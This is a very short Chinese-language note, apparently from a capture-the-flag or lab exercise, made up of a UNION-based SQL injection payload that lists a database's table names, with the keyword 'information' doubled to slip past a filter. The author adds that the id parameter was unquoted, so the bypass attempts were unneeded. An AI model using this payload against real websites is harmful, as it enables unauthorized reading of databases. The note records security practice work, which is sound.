```
?id=-1 union select 1,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()),3
```

 

id根本就没有被''号包含，是我固化思维了，



绕and or 绕了半天，原来是不用加引号。。。。
